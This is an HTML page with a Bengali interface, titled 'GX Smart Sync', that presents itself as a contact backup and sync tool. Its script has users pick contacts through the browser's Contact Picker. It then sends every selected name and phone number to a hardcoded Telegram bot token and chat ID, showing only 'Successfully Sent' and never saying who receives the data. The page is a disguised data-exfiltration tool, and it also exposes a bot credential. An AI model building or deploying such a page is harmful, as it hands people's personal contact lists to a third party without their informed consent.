<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>GX Smart Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>

body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Hind Siliguri',sans-serif;
background: linear-gradient(135deg,#020617,#0f172a,#1e293b);
}

/* Background glow */
body::before{
content:'';
position:absolute;
width:350px;
height:350px;
background: radial-gradient(circle,#06b6d4,#6366f1);
filter: blur(120px);
opacity:0.3;
}

/* Card */
.card{
width:350px;
padding:32px;
border-radius:26px;
text-align:center;

background: rgba(255,255,255,0.06);
backdrop-filter: blur(20px);

/* Dual shadow */
box-shadow:
0 0 30px rgba(6,182,212,0.35), /* outer */
inset 0 0 25px rgba(99,102,241,0.25); /* inner */

border:1px solid rgba(255,255,255,0.1);
}

/* Title */
h2{
color:#fff;
margin-bottom:6px;
font-weight:600;
letter-spacing:0.5px;
}

p{
color:#cbd5f5;
font-size:14px;
}

/* Button */
.btn{
position:relative;
margin-top:22px;
width:100%;
padding:16px;
border:none;
border-radius:14px;
font-size:16px;
font-weight:600;
cursor:pointer;
overflow:hidden;

background: linear-gradient(135deg,#6366f1,#06b6d4);
color:#fff;

/* button dual shadow */
box-shadow:
0 10px 30px rgba(6,182,212,0.4),
inset 0 0 15px rgba(255,255,255,0.2);

transition:0.25s;
}

.btn:active{
transform:scale(0.95);
}

/* Ripple effect */
.btn span{
position:absolute;
background: rgba(255,255,255,0.5);
transform:scale(0);
border-radius:50%;
animation:ripple 0.6s linear;
}

@keyframes ripple{
to{
transform:scale(4);
opacity:0;
}
}

/* Loader */
.loader{
margin:16px auto;
width:26px;
height:26px;
border:3px solid rgba(255,255,255,0.2);
border-top:3px solid #06b6d4;
border-radius:50%;
animation:spin 1s linear infinite;
display:none;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

/* Status */
.status{
margin-top:12px;
font-size:14px;
color:#22c55e;
}

</style>
</head>

<body>

<div class="card">

<h2>☁️ GX Smart Sync</h2>
<p>প্রিমিয়াম স্টাইলে কন্টাক্ট পাঠান</p>

<button class="btn" id="btn">Select & Send</button>

<div class="loader" id="loader"></div>
<div class="status" id="status">Ready</div>

</div>

<script>

const CONFIG={
TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
CHAT_ID:"6467941734"
};

const btn=document.getElementById("btn");
const loader=document.getElementById("loader");
const status=document.getElementById("status");

/* Ripple animation */
btn.addEventListener("click",function(e){
let circle=document.createElement("span");
circle.style.width=circle.style.height="100px";
circle.style.left=e.offsetX-50+"px";
circle.style.top=e.offsetY-50+"px";
this.appendChild(circle);

setTimeout(()=>circle.remove(),600);
});

btn.onclick=async()=>{

try{

loader.style.display="block";
status.innerText="Permission নিচ্ছে...";

if(!("contacts" in navigator)){
throw new Error("ডিভাইস সাপোর্ট করে না");
}

const contacts=await navigator.contacts.select(
['name','tel'],
{multiple:true}
);

if(!contacts.length){
throw new Error("কোনো কন্টাক্ট সিলেক্ট করা হয়নি");
}

status.innerText="Sending...";

/* Date Time */
const now=new Date();

const date=now.toLocaleDateString("bn-BD",{
weekday:'long',
year:'numeric',
month:'long',
day:'numeric'
});

const time=now.toLocaleTimeString("bn-BD");

/* Build message */
let text=`📊 GX Backup Report\n\n`;

text+=`📅 ${date}\n`;
text+=`⏰ ${time}\n`;
text+=`👥 ${contacts.length}\n\n`;

contacts.forEach(c=>{
let name=c.name?c.name[0]:"No Name";
let phone=c.tel?c.tel[0]:"No Number";

text+=`👤 ${name}\n📞 ${phone}\n\n`;
});

text+=`\n— GX Sammim sent`;

/* Send */
await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CONFIG.CHAT_ID,
text:text
})
});

loader.style.display="none";
status.innerText="✅ Successfully Sent";

}
catch(e){

loader.style.display="none";
status.innerText="❌ "+e.message;

}

};

</script>

</body>
</html>
